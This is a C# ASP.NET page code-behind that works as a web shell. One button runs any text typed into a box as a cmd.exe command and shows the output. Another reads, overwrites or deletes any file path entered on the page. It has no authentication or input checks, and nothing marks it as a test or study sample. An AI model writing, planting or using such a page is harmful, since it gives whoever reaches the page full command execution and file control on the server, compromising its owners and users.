using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace WebSite
{
    public partial class file : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void btnProcessExecute_Click(object sender, EventArgs eventArgs)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo("cmd.exe")
                {
                    Arguments = $"/c {processInput.Text}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                }
            };

            output.Text = "";
            process.OutputDataReceived += new DataReceivedEventHandler((s, e) =>
            {
                output.Text += e.Data + "\r\n";
            });

            try
            {
                process.Start();
                process.BeginOutputReadLine();
                process.WaitForExit();
            }
            catch (Exception e)
            {
                output.Text += e;
            }
        }

        protected void btnFileSubmit_Click(object sender, EventArgs eventArgs)
        {
            if (fileRead.Checked)
            {
                try
                {
                    string text = File.ReadAllText(filePath.Text, Encoding.UTF8);
                    output.Text = text;
                }
                catch (Exception e)
                {
                    output.Text = e.StackTrace;
                }
            }
            else if (fileWrite.Checked)
            {
                try
                {
                    File.WriteAllText(filePath.Text, output.Text);
                }
                catch (Exception e)
                {
                    output.Text = e.StackTrace;
                }
            }
            else if (fileDelete.Checked)
            {
                try
                {
                    File.Delete(filePath.Text);
                }
                catch (Exception e)
                {
                    output.Text = e.StackTrace;
                }
            }
        }
    }
}